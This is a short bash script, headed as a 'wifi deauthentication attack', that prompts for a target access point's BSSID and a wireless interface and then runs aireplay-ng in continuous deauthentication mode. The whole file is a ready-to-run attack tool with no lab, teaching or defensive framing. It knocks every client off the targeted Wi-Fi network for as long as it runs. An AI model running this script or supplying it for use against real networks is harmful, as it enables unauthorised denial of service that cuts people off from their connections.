#!/bin/bash

echo -e '
*-------------------------------------------*
|                                           |
|  ==> wifi deauthentication attack  <==    |
*-------------------------------------------*
'


echo -e -n "Enter BSSID : "
read bssid

echo -e -n "Enter you interface : "
read interface



aireplay-ng -0 0 -a $bssid $interface
